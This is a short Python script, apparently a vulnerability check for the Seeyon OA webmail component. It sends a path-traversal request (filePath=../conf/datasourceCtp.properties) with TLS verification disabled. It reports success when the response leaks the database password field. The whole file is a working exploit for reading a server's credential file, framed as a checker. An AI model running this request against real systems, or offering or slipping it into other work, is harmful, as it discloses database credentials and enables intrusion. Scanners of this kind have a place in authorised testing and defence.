import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "application/x-msdownload" in response.headers['Content-Type'] and "ctpDataSource.password" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
